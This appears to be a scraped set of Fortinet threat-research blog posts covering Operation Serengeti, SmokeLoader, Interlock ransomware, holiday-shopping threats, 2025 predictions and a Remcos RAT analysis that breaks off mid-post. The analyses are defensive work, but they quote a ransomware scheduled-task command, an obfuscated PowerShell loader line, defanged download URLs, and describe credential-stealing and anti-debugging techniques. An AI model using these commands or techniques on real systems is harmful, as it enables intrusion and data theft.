    "content": "FortiGuard Labs Threat Research Earlier this week, the International Criminal Police Organization (INTERPOL) and the African Union Mechanism for Police Cooperation (AFRIPOL)announcedthat the organizations have identified and arrested members of cybercrime groups operating across Africa. These individuals specialize in ransomware, digital extortion, online scams, and business email compromise (BEC) attacks. INTERPOL and AFRIPOL activities related to this effort, called Operation Serengeti, were supported by numerous partners, including Fortinet, and research from theCybercrime Atlas. The Cybercrime Atlas is a collaboration initiated by the World Economic Forum’sPartnership Against Cybercrime, in which cybercrime experts use open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. Fortinet is a launch partner of the Cybercrime Atlas, which has been in operation for a year. Separately, Fortinet, a longtime INTERPOL partner, was named a private contributing partner in Operation Serengeti for playing a vital role in sharing intelligence, supporting analysis, and disrupting criminal activities. As a result of Operation Serengeti, authorities across 19 participating countries arrested 1,006 suspects and dismantled nearly 135,000 malicious infrastructures and networks. The arrests follow months of international police collaboration, acting on information initially shared by partners, including the Cybercrime Atlas. This most recent effort identified and monitored these threat actors, leading to the arrests. Information provided by participating countries of ongoing cases with INTERPOL fed into 65 cyber analytical reports to ensure actions on the ground were intelligence-led and focused on the most significant actors. Seven private sector partners also played a vital role by sharing intelligence, supporting analysis, and disrupting criminal activities. These partners provided on-site support and offered around-the-clock remote assistance to patch vulnerabilities and secure critical infrastructure for the participating member countries. Operation Serengeti disrupted: These cybercrime operations resulted in a combined monetary loss of almost $193 million among numerous victims. The Cybercrime Atlas, which became operational earlier this year, was created to drive real impact and a coordinated effort to create a chain of disruption in the world of cybercrime. It will enable the entire cybersecurity community to become more resilient and effective at stopping cybercrime on a global scale. The Cybercrime Atlas comprises experts using open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. The group’s members currently include more than 20 law enforcement agencies, private-sector security companies, and incident responders, non-governmental organizations, financial institutions, and academic partners. In itsfirst year of operation, Cybercrime Atlas contributors shared more than 10,000 community-vetted and actionable data points and supported two cross-border cybercrime disruption efforts. They created seven comprehensive intelligence packages on emerging threats that were shared with law enforcement so that this actionable data could be operationalized. These intelligence packages created by Cybercrime Atlas contributed directly to the success of Operation Serengeti. Fortinet has been a trusted partner to INTERPOL since 2015, and officially became an INTERPOL Gateway partner in 2018. This ongoing collaboration has resulted in greater threat intelligence standards and protocols implemented across the industry and impactful global cybercriminal takedowns and disrupting criminal activities. In 2022,FortiGuard Labsprovided evidentiary support toINTERPOLand African Member countries as part of theAfrica Cyber Surge Operation(ASCO) to help detect, investigate, and disrupt cybercrime through coordinated law enforcement activities, utilizing INTERPOL platforms, tools, and channels in close cooperation with AFRIPOL. As a part of that effort, FortiGuard Labs provided actionable threat intelligence over six months, consisting ofbotnet,command and control (C2), andmalwareinfrastructure research, including C2, malware, and botnet victims in Africa. This enabled member countries to identify more than 1,000 malicious IP addresses, dark web markets, and individual threat actors. Turning the tide against cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale. No single organization can effectively halt cybercrime alone. These arrests are a strong example of how public-private partnerships can impact the disruption of large-scale cybercrime activities, leading to a safer, more resilient society. Every organization has a place in the chain of disruption against cyberthreats. Creating ongoing collaboration opportunities with high-profile, well-respected organizations from both the public and private sectors is a fundamental aspect of Fortinet’s commitment to enhancing cyber resilience around the globe. By working together, we can make meaningful progress in disrupting adversary operations. cybercrime,derek manky FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-contributes-to-major-cybercrime-operation-arrests"
  },
  {
    "title": "SmokeLoader Attack Targets Companies in Taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In September 2024, FortiGuard Labs observed an attack using the notorious SmokeLoader malware to target companies in Taiwan, including those in manufacturing, healthcare, information technology, and other sectors. SmokeLoader is well-known for its versatility and advanced evasion techniques, and its modular design allows it to perform a wide range of attacks. While SmokeLoader primarily serves as a downloader to deliver other malware, in this case, it carries out the attack itself by downloading plugins from its C2 server. Figure 2 shows a phishing email used in this campaign. The sender claims the attached malicious file is a quotation and includes a list of special instructions. While this email is persuasive, as it uses native words and phrases, these phishing emails are sent to multiple recipients with almost the same content. Even the recipient's name (the redaction in the file name) is not changed when sent to other companies. This has been observed in other attack chains of this campaign. In addition, the font and color of the email sign-off and telephone number are different from the main body, which suggests that the text may have been copied from elsewhere. Regardless of which it uses, the third stage uses a VBS file to launch the malware loader, AndeLoader, and the final payload is an identical file of SmokeLoader. CVE-2017-0199 is a vulnerability in Microsoft Office that exploits an OLE2-embedded link object. When a victim opens the crafted file, a malicious document is automatically downloaded and executed. The file attached to the phishing email is protected, and the object containing the malicious link is hidden in a sheet. CVE 2017-11882 is an RCE (Remote Code Execution) vulnerability in the equation editor in Microsoft Office. The shellcode contains a decryption algorithm and encrypted data. After the decryption, the shellcode gets the necessary APIs and downloads the VBS file for the next stage with theURLDownloadToFilefunction. The HTA file contains VBS code that is encoded using URL-encoded several times. After decoding, we see a VBS script with numerous spaces inserted between symbols and variables. Additionally, long variable names are used to frustrate analysis. The VBS script executes a snippet of PowerShell code, which downloads the VBS file for AndeLoader. Below is the deobfuscated PowerShell code. It downloads a steganographic image that contains base64-encoded data of the injector and extracts the data enclosed by<<BASE64_START>>and<<BASE64_END>>. After this, the data is decoded into the injector and itsdnlib.IO.Home.VAImethod, which receives six arguments: download link of the data for SmokeLoader, flag for persistence, file path, filename, injection target, and an unused argument. In this case, the persistence feature is not used, so the second, third, and fourth arguments are just filled withdestivado, which translates to “disabled” in English. TheClass.Startmethod combines all VBS files in the current working path of cmd.exe into a VBS file whose path and filename are specified by the third and fourth arguments ofTools.Ande,respectively. The file path is written to a new value namedPathin theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runregistry key to make the VBS file execute automatically when the system starts up. If this feature is used, it enables the VBS file downloaded in the previous stage to persist. After this, the TXT file specified by the first argument ofTools.Andeis downloaded, and its data is deobfuscated to get SmokeLoader, which is later injected intoRegAsm.exe. The following process of injection is commonly used: Below is SmokeLoader's execution flow. This section focuses on the plugins downloaded from its C2 server. Figure 14 shows that, though the response is404 Not Found, it still contains the payload for the attack. The payload contains configurations and the encrypted data for plugins: In this case, it contains configurations for Plugin 4, 5 (fgclearcookies), 8, and 9 (keylog_rules). This will be introduced later. Nine plugins are received from the C2 server, including three individual plugins and three plugins with 32-bit and 64-bit versions. According to the plugin's architecture, SmokeLoader uses a loop to sequentially inject these plugins intoexplorer.exe. SmokeLoader creates a suspended process ofexplorer.exeand writes encrypted data of the plugin and decryption algorithm along with a snippet of shellcode used to call the decryption algorithm. After this, it changes the code at the start of the entry point of explorer.exe into a jump to the shellcode and callsResumeThreadto execute the plugin. Below is the plugin list: Plugin 1 32-bits Steals login credentials, FTP credentials, cookies, autofill data from browsers, email software, and FTP client Plugin 2 64-bits Steals login credentials from Firefox and Thunderbird. The function is the same as what Plugin 1 uses. Plugin 3 32-bits Read data from email software Plugin 4 32-bits Injects its code into the browser and sets a hook to steal data Plugin 5 64-bits The 64-bit version of Plugin 4 Plugin 6 32-bits Injects its code into email software, browser, and FTP client and sets a hook to steal data Plugin 7 64-bits The 64-bit version of Plugin 6 Plugin 8 32-bits Injects its code into explorer.exe or processes specified by C2 server and sets a hook to steal data Plugin 9 64-bits The 64-bit version of Plugin 8 This plugin uses a loop to sequentially execute functions for the target software. The functions can be categorized into the following types according to the target: This plugin leverages functions in vaultcli.dll to get login credentials from Internet Explorer. Credential Manager is a feature in the Windows system that is used to store passwords. vaultcli.dll provides the functions to enumerate and get information from the credential vault. This plugin enumerates the registry keys underSoftware\\Mozillato find the one containing the valuePathToExeto get the default location of Firefox and Thunder. Then, the plugin searches forprofiles.iniin the default location and parses it to get the location oflogins.jsonandcookies.sqlite, from which it extracts login credentials. The plugin searches for theLocal Statefile withinWeb Data,Cookies,andLogin Datafolders under the installation path and then extracts login credentials and auto-fill data. To ensure it can locate the target file, it searches the following locations: It enumerates the registry keys under possible related registry keys to find the following values: It searches forsitemanager.xml,recentservers.xml, andfilezilla.xmlin the installation folder under%APPDATA%,%LOCALAPPDATA%orC:\\ProgramDatato collect the content in thehost,Port,User, andPasstags in these files. It enumerates the registry keys underSoftware\\Martin Prikrylto find theHostName,UserName,Password,RemoteDirectory, andPortNumbervalues. Email client keyword Path Outlook .pst, .ost Thunderbird .mab, .msf, inbox, sent, draft, template, archive The Bat! .tbb, .tbn, .abn When a data file is found, the plugin parses its structure to obtain the email addresses of people who sent an email to the victim or who received a copy of the email. The email addresses are then sent to the C2 server, and the process is closed. iexplore.exe, microsoftedge.exe, microsoftedgecp.exe, firefox.exe, chrome.exe, opera.exe, msedge.exe, plugin-container.exe (sub-process of Firefox, the relevant cookies are for Macromedia flash player) It then constantly monitors currently running processes and injects the other part of the plugin into target browsers to hook specified APIs. Like other plugins, the injected code includes shellcode, a decryption algorithm, and encrypted data. The difference is that the code for the jump to the shell code is written to theatanfunction ofntdll,and the plugin callsCreateRemoteThreadto run theatanfunction in the target process. The plugin hooks different APIs depending on where it is injected: Process DLL API firefox.exe Kernel32.dll VirtualQuery nspr4.dll or nss3.dll PR_GetDescType nspr4.dll PR_Write iexplore.exe microsoftedgecp.exe wininet.dll msedge.dll, chrome.dll, opera.dll, opera_browser.dll Unknown function Before setting the hook, it suspends threads except for the current thread of the injected process. Next, it modifies code at the start of the target APIs to jump to the function to send data passed to the API to the C2 server. The plugin obtains the addresses of most target APIs by callingGetProcAddress. The only exception is the method to get the unknown function in DLL files related to the browsers based on Chromium. It parses the structure of the.rdatasection to find the function matching a specific byte pattern. When the hooks are set, the plugin resumes other threads of the current process and terminates the current thread. Plugin 6 uses the same method to inject hooking code snippets into target processes. The API functions to hook areWSASendand thesendfunction inws2_32.dll. When these functions are called, the plugin collects FTP, SMTP, IMTP, and POP3 hostnames. DLL API Target user32.dll TranslateMessage Keyboard states and the window name where the user inputs the data GetClipboardData Get clipboard content SmokeLoader is a modular malware that is adaptable to different needs. In this case, SmokeLoader performs its attack with its plugins instead of downloading a completed file for the final stage. This shows the flexibility of SmokeLoader and emphasizes that analysts need to be careful even when looking at well-known malware like this. FortiGuard will continue monitoring these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked by FortiGuardAntivirusas: JS/Kryptik.CTS!tr.dldrVBS/TrojanDownloader.AAWM!tr.dldrW32/Smokeloader.F!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuardCDR(content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 198[.]23[.]188[.]14777[.]232[.]41[.]2991[.]183[.]104[.]24185[.]228[.]234[.]237 3e523ed80dbb592b1ff8c3345c3cd231ddd5a06e1af4c7b7d1f7f81249d0c4a3ad657479d9f6322daba65638523d65631ff83ba5a717261acb5a53fd48e522098dc06fdc2897d7c3438105ea0a39d2074774f80e051007fe7799b8195580ad2ffbe226dd0130c3c0c4db9d125cd25eca3c8e310dae8127d15c8be18041d41cd6392d201120936c1f0e77bdb4b490f2825c1e6f584f18055c742b36250f89566be29c269a4c3ee4bbd673bfe0d24ca7d131d9221607e26a60989e81d8ffc1709500874ab2a91433dfbfdc9ee6ade6173f3280737fc81505504ace11273f6406101a1c8cdac1c3cbae5f1140e850ee06b414259876dab97152669f7c0f93469b135dc92a6ed1ef2a5d9cf2a112532ad2c9fd70bff727e4cb60cd5d9c4966f2f77fa334ba0d8ac0676d09e41aa273589ee27338c44a09109a4d5defa45f1d9bd82b35e55053bed6b3c1027a3e7c140e67303e01e8fcbf42abac27b8e9df2a090ee3858d26e697bc60b642e5d92922b625f58532fc06f028962d8add5fa497981f337f9909677c290b98541be176251eca34b9f3d36555669a2639130adb97ca6958f4b16c3f8bff445fdcd9d7edb5883d20d7663c3744e137439fa961736d0a9471fb6ef14ac4cebf87f937f15553575f0f62ac62df917b490f602025a0985addd19dea895b5b1c03caa2b838b8def4e082392851325794c3bd2eb5ca7372d8e09ccfe7f6c1c0560bd56cd2df856d459b7fe7fd63b2f635c35151f61d4d04ce4162 a4ec792538455fb56f0b89ae10ddd0b2504afba092ba5cfa2083cf61b5fac0efcb92d320fc9bc674e8d37ceeebf0363f8e96dd67ef4ef543b3348f96ef567e5feb8381b156aad734ef3a0328b4985ed1edeca1c8d79d66e094598f8c6992ac71e3e7a3d0ba55b8dbbe3633b1dad0a3bbf4eada72dd8df3f7b1bc76a692862f23ea3b07a2356a7bfb92144f621ba551677a138c31d684072d69a4d37c1a378bb37ab20d40431b990a9a44e96dc53519f0af72eaf56c4b20f8995f95a48039bf67bdb897e6a8bfc21302ae1ac254b1b2e779684fe75b2b824cb24c80c775898940 f7544f07b4468e38e36607b5ac5b3835eac1487e7d16dd52ca882b3d021c19b6 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/sophisticated-attack-targets-taiwan-with-smokeloader"
  },
  {
    "title": "Ransomware Roundup - Interlock",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Interlock ransomware. Affected platforms:Microsoft Windows, FreeBSDImpacted parties:Microsoft Windows and FreeBSD usersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Interlock is a new ransomware variant that was first submitted to a publicly available file-scanning site in early October 2024. This could indicate that the ransomware emerged as early as September or even earlier. The Interlock ransomware comes in Windows and FreeBSD versions. It encrypts files on victims' machines and demands a ransom to decrypt them via dropped ransom notes. While the initial infection vector of the Interlock ransomware has not been identified, researcher Sina Kheirkhah(@SinSinology)reportedthat a previously unknown backdoor was found on a victim’s machine. It is possible that the ransomware was deployed through this backdoor. The Windows version of the ransomware claims to support the following versions of Windows: The Interlock ransomware takes the following parameters on execution: Once executed, the Interlock ransomware encrypts files on victims’ machines and drops a ransom note labeled “!__README__!.txt”. Files encrypted by the Interlock ransomware will have a “.interlock” file extension. The ransomware is designed to exclude the following files and filetypes from file encryption: .bat .bin .cab .cmd .com .cur .diagcab .diagcfg .diagpkg .drv .hlp .hta .ico .msi .ocx .psm1 .scr .sys .ini Thumbs.db .url .dll .exe .ps1 It also excludes the following folders from file encryption: $Recycle.Bin Boot Documents and Settings PerfLogs ProgramData Recovery System Volume Information Windows It also creates a scheduled task named \"TaskSystem\": schtasks /create /sc DAILY /tn \"TaskSystem\" /tr \"cmd /C cd %s && %s\" /st 20:00 /ru system > nul The above script creates a new scheduled task, TaskSystem, that runs every day at 20:00 using the System account. The FreeBSD version of the ransomware takes parameters on execution: Once the ransomware is executed, it encrypts files on victims' machines using the AES-CBC encryption algorithm and adds an \".interlock\" extension to the encrypted files. The ransomware then leaves a text file containing the same ransom note as the Windows version. The FreeBSD version of the Interlock ransomware skips files with an “.interlock”  extension from file encryption. It also excludes the following directories from file encryption: /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /run /root /sbin /snap /srv /sys /tmp /usr /var It also avoids encrypting the following file: At the time of our investigation, the Interlock ransomware data leak site listed six victims. Five of those were in the United States, and the other was in Italy. However, submission data to the publicly available scanning service potentially shows even broader victim locations. Interlock ransomware samples have been submitted from India, Italy, Japan, Germany, Peru, South Korea, Turkey, and the United States. The victims are in the education, finance, government, healthcare, and manufacturing sectors, indicating that the Interlock ransomware does not have a policy to avoid targeting essential businesses and organizations, as some other ransomware groups have. Each victim has its own page describing the victim’s organization and lists stolen and leaked files. The Interlock ransomware runs its data leak site on TOR, which is divided into the following four sections: The Interlock ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution, so customers with these products have up-to-date protection. Interlock Ransomware File IOCs SHA2 Note a26f0a2da63a838161a7d335aaa5e4b314a232acc15dcabdb6f6dbec63cda642 Interlock ransomware (Windows version) 28c3c50d115d2b8ffc7ba0a8de9572fbe307907aaae3a486aabd8c0266e9426f Interlock ransomware (FreeBSD version) e86bb8361c436be94b0901e5b39db9b6666134f23cce1e5581421c2981405cb1 f00a7652ad70ddb6871eeef5ece097e2cf68f3d9a6b7acfbffd33f82558ab50e IOCs of the backdoor malware reported by Sina Kheirkhah (@SinSinology) SHA2 Note e9ff4d40aeec2ff9d2886c7e7aea7634d8997a14ca3740645fd3101808cc187b Backdoor malware allegedly found on the Interock ransomware victim’s machine 7d750012afc9f680615fe3a23505f13ab738beef50cd92ebc864755af0775193 6933141fbdcdcaa9e92d6586dd549ac1cb21583ba9a27aa23cf133ecfdf36ddf It is vital to keep all AV and IPS signatures up to date due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and unwanted destruction or release of personally identifiable information (PII). Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance against phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, Fortinet delivers native synergy and automation across your security ecosystem. It also provides an extensive portfolio of technology- and human-based as-a-service offerings powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts. It provides unrivaled threat intelligence on the latest threat actor activity across the dark web, enabling a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to respond rapidly to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-interlock"
  },
  {
    "title": "Advanced Cyberthreats Targeting Holiday Shoppers",
    "content": "FortiGuard Labs Threat Research As the holiday season approaches, shoppers worldwide eagerly anticipate snagging deals during Black Friday, Cyber Monday, and other holiday sales. However, this heightened online activity also draws the attention of cybercriminals. A recent report from FortiGuard Labs,Understanding Threat Actor Readiness for the Upcoming Holiday Season, reveals the advanced tactics attackers have been developing to exploit this year’s shopping frenzy. This blog highlights the report’s key findings from the darknet and offers some practical advice to help shoppers and businesses stay secure this season. The holiday season presents an irresistible opportunity for cybercriminals to capitalize on increased online transactions. Tools and services now available on the darknet empower attackers to target e-commerce platforms and unsuspecting shoppers more effectively than ever. This year, threat actors are leveraging cutting-edge techniques, including AI-powered phishing lures, sophisticated website cloning tools, and remote code execution (RCE) exploits to gain unauthorized access to shopping platforms. AI-driven methods allow attackers to craft convincing emails and replicas of legitimate websites to steal data or trick users into disclosing sensitive information. The report also highlights the growing use of deceptive holiday-themed domains that mimic trusted retailers to lure shoppers with enticing but fraudulent offers. Sniffing tools are another critical weapon that enables cybercriminals to intercept sensitive data like credit card details during online transactions. Key highlights from the report include: To mitigate these risks, shoppers and businesses must adopt proactive measures. Vigilance is essential for shoppers. Double-check URLs before entering sensitive information and use secure payment methods such as credit cards with fraud protection. Avoid shopping over public Wi-Fi networks, which can leave you vulnerable to session hijacking. And enabling multi-factor authentication on your accounts can provide an additional layer of security. It is also crucial to monitor your financial statements regularly for unauthorized transactions. Businesses must prioritize their cybersecurity posture. Keeping e-commerce platforms and plugins up to date and conducting regular vulnerability scans can significantly reduce risk. Implementing advanced fraud detection tools helps identify unusual activities, such as brute-force login attempts or fake traffic. Educating customers on recognizing phishing attempts and promoting safe shopping habits is equally important. Monitoring domain registrations for potential impersonations and reporting them promptly can help protect your brand. Finally, securing admin panels with strong passwords and restricted access can prevent unauthorized breaches. The holiday season should be a time of joy and celebration, not risk and vulnerability. However, for this to happen, businesses must take a proactive stance on cybersecurity while consumers must stay informed and cautious about the threats lurking online. Download the FortiGuard Labs report,Understanding Threat Actor Readiness for the Upcoming Holiday Season, to better understand this year’s evolving threat landscape and gain actionable insights for protecting yourself, your business, and your customers. holiday shopping FortiGuard Labs Threat Research FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/advanced-cyberthreats-targeting-holiday-shoppers"
  },
  {
    "title": "Threat Predictions for 2025: Get Ready for Bigger, Bolder Attacks",
    "content": "FortiGuard Labs Threat Research While threat actors continue to rely on many “classic” tactics that have existed for decades, our threat predictions for the coming year largely focus on cybercriminals embracing bigger, bolder, and, from their perspectives, better attacks. From Cybercrime-as-a-Service (CaaS) groups becoming more specialized to adversaries using sophisticated playbooks that combine both digital and physical threats, cybercriminals are upping the ante to execute more targeted and harmful attacks. In our2025 threat predictions report, our FortiGuard Labs team looks at tried-and-true attacks cybercriminals continue to rely on and how these have evolved, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations worldwide can enhance their resilience in the face of a changing threat landscape. As cybercrime evolves, we anticipate seeing several unique trends emerge in 2025 and beyond. Here’s a glimpse of what we expect. Cybercriminals will always find new ways to infiltrate organizations. Yet there are numerous opportunities for the cybersecurity community to collaborate to better anticipate adversaries’ next moves and interrupt their activities in a meaningful way. The value of industrywide efforts and public-private partnerships cannot be overstated, and we anticipate that the number of organizations participating in these collaborations will grow in the coming years. Additionally, organizations must remember that cybersecurity is everyone’s job, not just the responsibility of the security and IT teams. For example, implementing enterprisewide security awareness and training is a vital component of managing risk. And finally, other entities have a responsibility to promote and adhere to robust cybersecurity practices, ranging from governments to the vendors that manufacture the security products we rely on. No single organization or security team can disrupt cybercrime alone. By working together and sharing intelligence across the industry, we’re collectively better positioned to fight against adversaries and effectively protect society. Download a copy of ourfull predictions report for 2025. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio.Sign up for FortiGuard Outbreak Alertsto stay up to speed on the latest breaking threats. Learn more about Fortinet’sfree cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda, or about the FortinetNetwork Security Expert program,Academic Partner program, andVeterans program. derek manky Business and Technology Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/threat-predictions-for-2025-get-ready-for-bigger-bolder-attacks"
  },
  {
    "title": "New Campaign Uses Remcos RAT to Exploit Victims",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control a victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently noticed a phishing campaign in the wild. It is initialized with a phishing email containing a malicious Excel document. Upon researching the campaign, I found it was spreading a new variant of the Remcos RAT. Remcos is a commercial RAT (remote administration tool) sold online. It provides purchases with a wide range of advanced features to remotely control computers belonging to the buyer. However, threat actors have abused Remcos to collect sensitive information from victims and remotely control their computers to perform further malicious acts. Figure 1 displays the Remcos webpage. In this security blog, I will show how Remcos is delivered to a victim’s device, what kinds of anti-analysis techniques it leverages to protect itself from being analyzed, how this variant of Remcos is deployed, how it achieves persistence on the victim’s device, and what advanced features Remcos provides to remotely control a victim’s device. The phishing email is shown in Figure 2. It contains an attached malicious Excel file disguised as an order file to convince the recipient to open the document. CVE-2017-0199is a Remote Code Execution vulnerability that exploits how Microsoft Office and WordPad parse specially crafted files. Once the recipient opens the attached file, the MS Excel program shows the file content, as seen in Figure 3. In the background, the CVE-2017-0199 vulnerability is exploited to download an HTA file and execute it on the recipient’s device. As you may know, a crafted embedded OLE object leads to this vulnerability. Figure 4 demonstrates the content of the crafted embedded OLE object (“\\x01Ole”). MS Excel program accesses the short URL “hxxps://og1[.]in/2Rxzb3.” It is then redirected to another URL, “hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.hta”. The download packet, shown in Figure 5, is a Wireshark screenshot. The HTA file is an HTML Application file. It is executed by a Windows-native application (mshta.exe) called by MS Excel using DCOM components. Its code is wrapped in multiple layers using different script languages and encoding methods, including JavaScript, VBScript, Base64-encoded, URL-encoded, and PowerShell, to protect itself from detection and analysis. Figure 6 shows some script code examples. These are executed when the downloaded HTA file is parsed in mshta.exe. Take a look at the Powershell code at the bottom of Figure 6. It calls the API URLDownloadToFile() to download an EXE file from the URL “hxxp://192[.]3[.]220[.]22/430/dllhost.exe” into a local file, “%AppData%\\dllhost.exe.” Executing “STaRt $EnV: APPDATA\\dllhost.exe” starts the downloaded EXE file on the victim’s device. Once the downloaded EXE file, dllhost.exe, starts, it extracts a batch of files into the %AppData% folder. Figure 7 is a screenshot of the extracted files and sub-folders located in %AppData%\\intercessionate\\Favourablies117\\sulfonylurea. Some of the key data are hidden in these files. dllhost.exe then runs the PowerShell program by calling the API CreateProcessW() to execute a piece of PowerShell code, as illustrated in Figure 8. Since dllhost.exe is a 32-bit process, it runs a 32-bit PowerShell, “C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe.” This is important because the malicious code only works on the 32-bit PowerShell process. The PowerShell code breaks down as follows. $krjning=Get-Content -Raw '%AppData% \\intercessionate\\Favourablies117\\sulfonylurea\\Aerognosy.Res';$Lukewarmly95=$krjning.SubString(5322,3);.$Lukewarmly95($krjning) It reads the content of “Aerognosy.Res,” an extracted file, into a local variable “$krjning,” which is full of PowerShell script. “iEx” is the return value of SubString(5322,3), which is short for an Invoke-Expression used to run a string as a command or expression.  Finally, “iEx” executes the entire PowerShell script (“Aerognosy.Res”) after calling “.$Lukewarmly95($krjning).” Again, the PowerShell code is thoroughly obfuscated and encoded. Based on my research on the code, I discovered it performs the following functions: As I mentioned, the copied malicious code relies on a 32-bit version of PowerShell. It first runs a piece of self-decryption code mixed with a huge amount of useless instructions, creating a big challenge for analysts. Figure 10 presents the end of the decrypting code, where it is about to execute the “call edi” instruction. The EDI register now points to the decrypted code, as shown on the right. It leverages numerous complicated anti-analysis techniques to protect itself from being analyzed. 1.  It installs a vectored exception handler. Whenever an exception occurs, the exception handler is called to handle it. The exception code provides corresponding ways to restore the code to resume from another offset. There are numerous exception instructions inside the malicious code. In other words, this strategy drives the entire code. Figure 11 shows an instruction that can raise an exception (0x8000003) at 0xEE16222, which the exception handler will then capture and handle. The exception handler function also checks the DR registers (Debug Registers), which are Dr0, Dr1, Dr2, Dr3, Dr4, Dr5, Dr6, and Dr7. Their values are not 0 when a debugger is present. 2.  System APIs are dynamically gained and called in a unique way. There are no API name constant strings in the code. Instead, it keeps the hash codes of the API names. Whenever it calls an API, it uses a unique function that retrieves the API information from the PEB, which is pointed to by fs:[30h] to get their function address by matching the name’s hash code. This raises the difficulty of performing static analysis. In addition, it has another function that is called every time an API is called. This function detects if the debugger has set the API breakpoint. It also encrypts the code from the caller’s return address to the base address, which cleans up the code just executed. 3.  It is called ZwSetInformationThread(), and it performs anti-debugging. The malicious code calls API ZwSetInformationThread() with the argument  ThreadHideFromDebugger (0x11) and the current thread (0xFFFFFFFE). This mechanism in Windows can conceal a thread’s existence from debuggers. Figure 12 illustrates how it calls this API with the associated arguments. If a debugger is attached to the current process, it exits immediately once the API is called. 4.  It checks the result value of API ZwQueryInformationProcess(). It calls API ZwQueryInformationProcess() with the ProcessDebugPort (7) argument to detect if the debugPort is set (non-zero value). If yes, this means a debugger is attached to the current process (PowerShell.exe). 5.  All the constant values are gained at run time. Please refer to the code snippet below to see how it splits “mov ebx 100h” into three instructions. 6.  It uses an API hooking technique for several APIs. The malicious code simulates executing multiple API instructions (say, two instructions) at the beginning and then jumps to the API to execute the rest of the instructions (beginning with the 3rd instruction). Below is an example for CreateProcessInternalW(). The 